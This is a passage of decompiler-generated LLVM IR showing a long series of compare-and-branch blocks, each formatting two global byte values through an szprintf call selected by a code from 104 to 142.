  %v8_bf58 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff30.273 to i32), i32 %v4_bf58, i32 %v6_bf58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf5c

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf28, %dec_label_pc_bf34
  %v7_bf60 = icmp eq i32 %v2_a7e0, 104
  br i1 %v7_bf60, label %dec_label_pc_bf68, label %dec_label_pc_bf90

dec_label_pc_bf68:                                ; preds = %dec_label_pc_bf5c
  %v3_bf74 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bf80 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bf8c = sext i8 %v3_bf74 to i32
  %v6_bf8c = sext i8 %v3_bf80 to i32
  %v8_bf8c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff40.275 to i32), i32 %v4_bf8c, i32 %v6_bf8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf90

dec_label_pc_bf90:                                ; preds = %dec_label_pc_bf5c, %dec_label_pc_bf68
  %v7_bf94 = icmp eq i32 %v2_a7e0, 105
  br i1 %v7_bf94, label %dec_label_pc_bf9c, label %dec_label_pc_bfc4

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf90
  %v3_bfa8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bfb4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bfc0 = sext i8 %v3_bfa8 to i32
  %v6_bfc0 = sext i8 %v3_bfb4 to i32
  %v8_bfc0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff50.277 to i32), i32 %v4_bfc0, i32 %v6_bfc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bf90, %dec_label_pc_bf9c
  %v7_bfc8 = icmp eq i32 %v2_a7e0, 106
  br i1 %v7_bfc8, label %dec_label_pc_bfd0, label %dec_label_pc_bff8

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_bfc4
  %v3_bfdc = load i8, i8* @global_var_2e471.71, align 1
  %v3_bfe8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bff4 = sext i8 %v3_bfdc to i32
  %v6_bff4 = sext i8 %v3_bfe8 to i32
  %v8_bff4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1ff60.279 to i32), i32 %v4_bff4, i32 %v6_bff4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bff8

dec_label_pc_bff8:                                ; preds = %dec_label_pc_bfc4, %dec_label_pc_bfd0
  %v7_bffc = icmp eq i32 %v2_a7e0, 107
  br i1 %v7_bffc, label %dec_label_pc_c004, label %dec_label_pc_c02c

dec_label_pc_c004:                                ; preds = %dec_label_pc_bff8
  %v3_c010 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c01c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c028 = sext i8 %v3_c010 to i32
  %v6_c028 = sext i8 %v3_c01c to i32
  %v8_c028 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff6c.281 to i32), i32 %v4_c028, i32 %v6_c028, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bff8, %dec_label_pc_c004
  %v7_c030 = icmp eq i32 %v2_a7e0, 108
  br i1 %v7_c030, label %dec_label_pc_c038, label %dec_label_pc_c060

dec_label_pc_c038:                                ; preds = %dec_label_pc_c02c
  %v3_c044 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c050 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c05c = sext i8 %v3_c044 to i32
  %v6_c05c = sext i8 %v3_c050 to i32
  %v8_c05c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ff7c.283 to i32), i32 %v4_c05c, i32 %v6_c05c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c060

dec_label_pc_c060:                                ; preds = %dec_label_pc_c02c, %dec_label_pc_c038
  %v7_c064 = icmp eq i32 %v2_a7e0, 109
  br i1 %v7_c064, label %dec_label_pc_c06c, label %dec_label_pc_c094

dec_label_pc_c06c:                                ; preds = %dec_label_pc_c060
  %v3_c078 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c084 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c090 = sext i8 %v3_c078 to i32
  %v6_c090 = sext i8 %v3_c084 to i32
  %v8_c090 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ff8c.285 to i32), i32 %v4_c090, i32 %v6_c090, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c094

dec_label_pc_c094:                                ; preds = %dec_label_pc_c060, %dec_label_pc_c06c
  %v7_c098 = icmp eq i32 %v2_a7e0, 110
  br i1 %v7_c098, label %dec_label_pc_c0a0, label %dec_label_pc_c0c8

dec_label_pc_c0a0:                                ; preds = %dec_label_pc_c094
  %v3_c0ac = load i8, i8* @global_var_2e471.71, align 1
  %v3_c0b8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c0c4 = sext i8 %v3_c0ac to i32
  %v6_c0c4 = sext i8 %v3_c0b8 to i32
  %v8_c0c4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff9c.287 to i32), i32 %v4_c0c4, i32 %v6_c0c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0c8

dec_label_pc_c0c8:                                ; preds = %dec_label_pc_c094, %dec_label_pc_c0a0
  %v7_c0cc = icmp eq i32 %v2_a7e0, 111
  br i1 %v7_c0cc, label %dec_label_pc_c0d4, label %dec_label_pc_c0fc

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c0c8
  %v3_c0e0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c0ec = load i8, i8* @global_var_2e472.72, align 1
  %v4_c0f8 = sext i8 %v3_c0e0 to i32
  %v6_c0f8 = sext i8 %v3_c0ec to i32
  %v8_c0f8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ffac.289 to i32), i32 %v4_c0f8, i32 %v6_c0f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0fc

dec_label_pc_c0fc:                                ; preds = %dec_label_pc_c0c8, %dec_label_pc_c0d4
  %v7_c100 = icmp eq i32 %v2_a7e0, 112
  br i1 %v7_c100, label %dec_label_pc_c108, label %dec_label_pc_c130

dec_label_pc_c108:                                ; preds = %dec_label_pc_c0fc
  %v3_c114 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c120 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c12c = sext i8 %v3_c114 to i32
  %v6_c12c = sext i8 %v3_c120 to i32
  %v8_c12c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ffbc.291 to i32), i32 %v4_c12c, i32 %v6_c12c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c130

dec_label_pc_c130:                                ; preds = %dec_label_pc_c0fc, %dec_label_pc_c108
  %v7_c134 = icmp eq i32 %v2_a7e0, 113
  br i1 %v7_c134, label %dec_label_pc_c13c, label %dec_label_pc_c164

dec_label_pc_c13c:                                ; preds = %dec_label_pc_c130
  %v3_c148 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c154 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c160 = sext i8 %v3_c148 to i32
  %v6_c160 = sext i8 %v3_c154 to i32
  %v8_c160 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ffcc.293 to i32), i32 %v4_c160, i32 %v6_c160, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c164

dec_label_pc_c164:                                ; preds = %dec_label_pc_c130, %dec_label_pc_c13c
  %v7_c168 = icmp eq i32 %v2_a7e0, 114
  br i1 %v7_c168, label %dec_label_pc_c170, label %dec_label_pc_c198

dec_label_pc_c170:                                ; preds = %dec_label_pc_c164
  %v3_c17c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c188 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c194 = sext i8 %v3_c17c to i32
  %v6_c194 = sext i8 %v3_c188 to i32
  %v8_c194 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ffdc.295 to i32), i32 %v4_c194, i32 %v6_c194, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c164, %dec_label_pc_c170
  %v7_c19c = icmp eq i32 %v2_a7e0, 115
  br i1 %v7_c19c, label %dec_label_pc_c1a4, label %dec_label_pc_c1cc

dec_label_pc_c1a4:                                ; preds = %dec_label_pc_c198
  %v3_c1b0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c1bc = load i8, i8* @global_var_2e472.72, align 1
  %v4_c1c8 = sext i8 %v3_c1b0 to i32
  %v6_c1c8 = sext i8 %v3_c1bc to i32
  %v8_c1c8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ffec.297 to i32), i32 %v4_c1c8, i32 %v6_c1c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c198, %dec_label_pc_c1a4
  %v7_c1d0 = icmp eq i32 %v2_a7e0, 116
  br i1 %v7_c1d0, label %dec_label_pc_c1d8, label %dec_label_pc_c200

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c1cc
  %v3_c1e4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c1f0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c1fc = sext i8 %v3_c1e4 to i32
  %v6_c1fc = sext i8 %v3_c1f0 to i32
  %v8_c1fc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fffc.299 to i32), i32 %v4_c1fc, i32 %v6_c1fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c200

dec_label_pc_c200:                                ; preds = %dec_label_pc_c1cc, %dec_label_pc_c1d8
  %v7_c204 = icmp eq i32 %v2_a7e0, 117
  br i1 %v7_c204, label %dec_label_pc_c20c, label %dec_label_pc_c234

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c200
  %v3_c218 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c224 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c230 = sext i8 %v3_c218 to i32
  %v6_c230 = sext i8 %v3_c224 to i32
  %v8_c230 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_2000c.301 to i32), i32 %v4_c230, i32 %v6_c230, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c200, %dec_label_pc_c20c
  %v7_c238 = icmp eq i32 %v2_a7e0, 118
  br i1 %v7_c238, label %dec_label_pc_c240, label %dec_label_pc_c268

dec_label_pc_c240:                                ; preds = %dec_label_pc_c234
  %v3_c24c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c258 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c264 = sext i8 %v3_c24c to i32
  %v6_c264 = sext i8 %v3_c258 to i32
  %v8_c264 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_2001c.303 to i32), i32 %v4_c264, i32 %v6_c264, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c268

dec_label_pc_c268:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c240
  %v7_c26c = icmp eq i32 %v2_a7e0, 119
  br i1 %v7_c26c, label %dec_label_pc_c274, label %dec_label_pc_c29c

dec_label_pc_c274:                                ; preds = %dec_label_pc_c268
  %v3_c280 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c28c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c298 = sext i8 %v3_c280 to i32
  %v6_c298 = sext i8 %v3_c28c to i32
  %v8_c298 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_2002c.305 to i32), i32 %v4_c298, i32 %v6_c298, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c29c

dec_label_pc_c29c:                                ; preds = %dec_label_pc_c268, %dec_label_pc_c274
  %v7_c2a0 = icmp eq i32 %v2_a7e0, 120
  br i1 %v7_c2a0, label %dec_label_pc_c2a8, label %dec_label_pc_c2d0

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c29c
  %v3_c2b4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c2c0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c2cc = sext i8 %v3_c2b4 to i32
  %v6_c2cc = sext i8 %v3_c2c0 to i32
  %v8_c2cc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_2003c.307 to i32), i32 %v4_c2cc, i32 %v6_c2cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d0

dec_label_pc_c2d0:                                ; preds = %dec_label_pc_c29c, %dec_label_pc_c2a8
  %v7_c2d4 = icmp eq i32 %v2_a7e0, 121
  br i1 %v7_c2d4, label %dec_label_pc_c2dc, label %dec_label_pc_c304

dec_label_pc_c2dc:                                ; preds = %dec_label_pc_c2d0
  %v3_c2e8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c2f4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c300 = sext i8 %v3_c2e8 to i32
  %v6_c300 = sext i8 %v3_c2f4 to i32
  %v8_c300 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ff7c.283 to i32), i32 %v4_c300, i32 %v6_c300, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c304

dec_label_pc_c304:                                ; preds = %dec_label_pc_c2d0, %dec_label_pc_c2dc
  %v7_c308 = icmp eq i32 %v2_a7e0, 122
  br i1 %v7_c308, label %dec_label_pc_c310, label %dec_label_pc_c338

dec_label_pc_c310:                                ; preds = %dec_label_pc_c304
  %v3_c31c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c328 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c334 = sext i8 %v3_c31c to i32
  %v6_c334 = sext i8 %v3_c328 to i32
  %v8_c334 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_2004c.309 to i32), i32 %v4_c334, i32 %v6_c334, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c338

dec_label_pc_c338:                                ; preds = %dec_label_pc_c304, %dec_label_pc_c310
  %v7_c33c = icmp eq i32 %v2_a7e0, 123
  br i1 %v7_c33c, label %dec_label_pc_c344, label %dec_label_pc_c36c

dec_label_pc_c344:                                ; preds = %dec_label_pc_c338
  %v3_c350 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c35c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c368 = sext i8 %v3_c350 to i32
  %v6_c368 = sext i8 %v3_c35c to i32
  %v8_c368 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_2005c.311 to i32), i32 %v4_c368, i32 %v6_c368, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c338, %dec_label_pc_c344
  %v7_c370 = icmp eq i32 %v2_a7e0, 124
  br i1 %v7_c370, label %dec_label_pc_c378, label %dec_label_pc_c3a0

dec_label_pc_c378:                                ; preds = %dec_label_pc_c36c
  %v3_c384 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c390 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c39c = sext i8 %v3_c384 to i32
  %v6_c39c = sext i8 %v3_c390 to i32
  %v8_c39c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20068.313 to i32), i32 %v4_c39c, i32 %v6_c39c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3a0

dec_label_pc_c3a0:                                ; preds = %dec_label_pc_c36c, %dec_label_pc_c378
  %v7_c3a4 = icmp eq i32 %v2_a7e0, 125
  br i1 %v7_c3a4, label %dec_label_pc_c3ac, label %dec_label_pc_c3d4

dec_label_pc_c3ac:                                ; preds = %dec_label_pc_c3a0
  %v3_c3b8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c3c4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c3d0 = sext i8 %v3_c3b8 to i32
  %v6_c3d0 = sext i8 %v3_c3c4 to i32
  %v8_c3d0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20078.315 to i32), i32 %v4_c3d0, i32 %v6_c3d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3d4

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_c3a0, %dec_label_pc_c3ac
  %v7_c3d8 = icmp eq i32 %v2_a7e0, 126
  br i1 %v7_c3d8, label %dec_label_pc_c3e0, label %dec_label_pc_c408

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c3d4
  %v3_c3ec = load i8, i8* @global_var_2e471.71, align 1
  %v3_c3f8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c404 = sext i8 %v3_c3ec to i32
  %v6_c404 = sext i8 %v3_c3f8 to i32
  %v8_c404 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20068.313 to i32), i32 %v4_c404, i32 %v6_c404, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c408

dec_label_pc_c408:                                ; preds = %dec_label_pc_c3d4, %dec_label_pc_c3e0
  %v7_c40c = icmp eq i32 %v2_a7e0, 127
  br i1 %v7_c40c, label %dec_label_pc_c414, label %dec_label_pc_c43c

dec_label_pc_c414:                                ; preds = %dec_label_pc_c408
  %v3_c420 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c42c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c438 = sext i8 %v3_c420 to i32
  %v6_c438 = sext i8 %v3_c42c to i32
  %v8_c438 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20088.317 to i32), i32 %v4_c438, i32 %v6_c438, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c43c

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c408, %dec_label_pc_c414
  %v7_c440 = icmp eq i32 %v2_a7e0, 128
  br i1 %v7_c440, label %dec_label_pc_c448, label %dec_label_pc_c470

dec_label_pc_c448:                                ; preds = %dec_label_pc_c43c
  %v3_c454 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c460 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c46c = sext i8 %v3_c454 to i32
  %v6_c46c = sext i8 %v3_c460 to i32
  %v8_c46c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20098.319 to i32), i32 %v4_c46c, i32 %v6_c46c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c43c, %dec_label_pc_c448
  %v7_c474 = icmp eq i32 %v2_a7e0, 129
  br i1 %v7_c474, label %dec_label_pc_c47c, label %dec_label_pc_c4a4

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c470
  %v3_c488 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c494 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c4a0 = sext i8 %v3_c488 to i32
  %v6_c4a0 = sext i8 %v3_c494 to i32
  %v8_c4a0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200a8.321 to i32), i32 %v4_c4a0, i32 %v6_c4a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4a4

dec_label_pc_c4a4:                                ; preds = %dec_label_pc_c470, %dec_label_pc_c47c
  %v7_c4a8 = icmp eq i32 %v2_a7e0, 130
  br i1 %v7_c4a8, label %dec_label_pc_c4b0, label %dec_label_pc_c4d8

dec_label_pc_c4b0:                                ; preds = %dec_label_pc_c4a4
  %v3_c4bc = load i8, i8* @global_var_2e471.71, align 1
  %v3_c4c8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c4d4 = sext i8 %v3_c4bc to i32
  %v6_c4d4 = sext i8 %v3_c4c8 to i32
  %v8_c4d4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200b8.323 to i32), i32 %v4_c4d4, i32 %v6_c4d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %dec_label_pc_c4a4, %dec_label_pc_c4b0
  %v7_c4dc = icmp eq i32 %v2_a7e0, 131
  br i1 %v7_c4dc, label %dec_label_pc_c4e4, label %dec_label_pc_c50c

dec_label_pc_c4e4:                                ; preds = %dec_label_pc_c4d8
  %v3_c4f0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c4fc = load i8, i8* @global_var_2e472.72, align 1
  %v4_c508 = sext i8 %v3_c4f0 to i32
  %v6_c508 = sext i8 %v3_c4fc to i32
  %v8_c508 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200c8.325 to i32), i32 %v4_c508, i32 %v6_c508, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c50c

dec_label_pc_c50c:                                ; preds = %dec_label_pc_c4d8, %dec_label_pc_c4e4
  %v7_c510 = icmp eq i32 %v2_a7e0, 132
  br i1 %v7_c510, label %dec_label_pc_c518, label %dec_label_pc_c540

dec_label_pc_c518:                                ; preds = %dec_label_pc_c50c
  %v3_c524 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c530 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c53c = sext i8 %v3_c524 to i32
  %v6_c53c = sext i8 %v3_c530 to i32
  %v8_c53c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200d8.327 to i32), i32 %v4_c53c, i32 %v6_c53c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c540

dec_label_pc_c540:                                ; preds = %dec_label_pc_c50c, %dec_label_pc_c518
  %v7_c544 = icmp eq i32 %v2_a7e0, 133
  br i1 %v7_c544, label %dec_label_pc_c54c, label %dec_label_pc_c574

dec_label_pc_c54c:                                ; preds = %dec_label_pc_c540
  %v3_c558 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c564 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c570 = sext i8 %v3_c558 to i32
  %v6_c570 = sext i8 %v3_c564 to i32
  %v8_c570 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200e8.329 to i32), i32 %v4_c570, i32 %v6_c570, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c574

dec_label_pc_c574:                                ; preds = %dec_label_pc_c540, %dec_label_pc_c54c
  %v7_c578 = icmp eq i32 %v2_a7e0, 134
  br i1 %v7_c578, label %dec_label_pc_c580, label %dec_label_pc_c5a8

dec_label_pc_c580:                                ; preds = %dec_label_pc_c574
  %v3_c58c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c598 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c5a4 = sext i8 %v3_c58c to i32
  %v6_c5a4 = sext i8 %v3_c598 to i32
  %v8_c5a4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_200f8.331 to i32), i32 %v4_c5a4, i32 %v6_c5a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5a8

dec_label_pc_c5a8:                                ; preds = %dec_label_pc_c574, %dec_label_pc_c580
  %v7_c5ac = icmp eq i32 %v2_a7e0, 135
  br i1 %v7_c5ac, label %dec_label_pc_c5b4, label %dec_label_pc_c5dc

dec_label_pc_c5b4:                                ; preds = %dec_label_pc_c5a8
  %v3_c5c0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c5cc = load i8, i8* @global_var_2e472.72, align 1
  %v4_c5d8 = sext i8 %v3_c5c0 to i32
  %v6_c5d8 = sext i8 %v3_c5cc to i32
  %v8_c5d8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20108.333 to i32), i32 %v4_c5d8, i32 %v6_c5d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5dc

dec_label_pc_c5dc:                                ; preds = %dec_label_pc_c5a8, %dec_label_pc_c5b4
  %v7_c5e0 = icmp eq i32 %v2_a7e0, 136
  br i1 %v7_c5e0, label %dec_label_pc_c5e8, label %dec_label_pc_c610

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5dc
  %v3_c5f4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c600 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c60c = sext i8 %v3_c5f4 to i32
  %v6_c60c = sext i8 %v3_c600 to i32
  %v8_c60c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20118.335 to i32), i32 %v4_c60c, i32 %v6_c60c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c610

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5dc, %dec_label_pc_c5e8
  %v7_c614 = icmp eq i32 %v2_a7e0, 137
  br i1 %v7_c614, label %dec_label_pc_c61c, label %dec_label_pc_c644

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c610
  %v3_c628 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c634 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c640 = sext i8 %v3_c628 to i32
  %v6_c640 = sext i8 %v3_c634 to i32
  %v8_c640 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20128.337 to i32), i32 %v4_c640, i32 %v6_c640, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c644

dec_label_pc_c644:                                ; preds = %dec_label_pc_c610, %dec_label_pc_c61c
  %v7_c648 = icmp eq i32 %v2_a7e0, 138
  br i1 %v7_c648, label %dec_label_pc_c650, label %dec_label_pc_c678

dec_label_pc_c650:                                ; preds = %dec_label_pc_c644
  %v3_c65c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c668 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c674 = sext i8 %v3_c65c to i32
  %v6_c674 = sext i8 %v3_c668 to i32
  %v8_c674 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20138.339 to i32), i32 %v4_c674, i32 %v6_c674, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c644, %dec_label_pc_c650
  %v7_c67c = icmp eq i32 %v2_a7e0, 139
  br i1 %v7_c67c, label %dec_label_pc_c684, label %dec_label_pc_c6ac

dec_label_pc_c684:                                ; preds = %dec_label_pc_c678
  %v3_c690 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c69c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c6a8 = sext i8 %v3_c690 to i32
  %v6_c6a8 = sext i8 %v3_c69c to i32
  %v8_c6a8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20148.341 to i32), i32 %v4_c6a8, i32 %v6_c6a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c678, %dec_label_pc_c684
  %v7_c6b0 = icmp eq i32 %v2_a7e0, 140
  br i1 %v7_c6b0, label %dec_label_pc_c6b8, label %dec_label_pc_c6e0

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c6ac
  %v3_c6c4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c6d0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c6dc = sext i8 %v3_c6c4 to i32
  %v6_c6dc = sext i8 %v3_c6d0 to i32
  %v8_c6dc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20158.343 to i32), i32 %v4_c6dc, i32 %v6_c6dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6e0

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c6ac, %dec_label_pc_c6b8
  %v7_c6e4 = icmp eq i32 %v2_a7e0, 141
  br i1 %v7_c6e4, label %dec_label_pc_c6ec, label %dec_label_pc_c714

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6e0
  %v3_c6f8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c704 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c710 = sext i8 %v3_c6f8 to i32
  %v6_c710 = sext i8 %v3_c704 to i32
  %v8_c710 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20168.345 to i32), i32 %v4_c710, i32 %v6_c710, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c6e0, %dec_label_pc_c6ec
  %v7_c718 = icmp eq i32 %v2_a7e0, 142
  br i1 %v7_c718, label %dec_label_pc_c720, label %dec_label_pc_c748

dec_label_pc_c720:                                ; preds = %dec_label_pc_c714
  %v3_c72c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c738 = load i8, i8* @global_var_2e472.72, align 1
